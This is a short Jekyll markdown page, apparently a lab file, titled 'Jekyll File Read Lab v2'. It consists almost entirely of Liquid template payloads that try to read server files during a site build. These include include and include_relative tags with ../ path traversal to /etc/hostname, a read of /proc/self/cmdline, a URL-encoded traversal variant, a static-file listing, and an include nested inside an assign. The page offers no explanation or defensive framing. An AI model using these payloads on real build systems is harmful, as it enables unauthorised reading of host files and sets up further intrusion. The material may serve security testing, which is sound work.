---
layout: default
title: "Jekyll File Read Lab v2"
---

## Direct Liquid File Read Attempts

### include /etc/hostname
{% include /etc/hostname %}

### include_relative ../../../../etc/hostname
{% include_relative ../../../../etc/hostname %}

### include /proc/self/cmdline
{% include /proc/self/cmdline %}

### include_relative with encoded path
{% include_relative ..%2F..%2F..%2F..%2Fetc%2Fhostname %}

### Liquid read with site data
{% for file in site.static_files %}
- {{ file.path }}
{% endfor %}

### assign from include
{% assign hostname_content = '' | append: '{% include /etc/hostname %}' %}
{{ hostname_content }}